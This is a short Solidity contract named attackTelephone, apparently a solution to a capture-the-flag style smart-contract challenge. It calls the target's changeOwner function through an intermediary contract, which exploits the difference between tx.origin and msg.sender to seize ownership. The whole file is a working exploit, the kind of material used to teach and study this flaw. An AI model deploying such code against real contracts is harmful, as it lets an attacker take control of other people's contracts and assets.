// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone{
     function changeOwner(address _owner) external;
}

contract attackTelephone{
    ITelephone public immutable TelephoneContract;

    constructor(address _TelephoneContract){
        TelephoneContract = ITelephone(_TelephoneContract);
    }
    function attack() public{
        TelephoneContract.changeOwner(msg.sender);
    }

}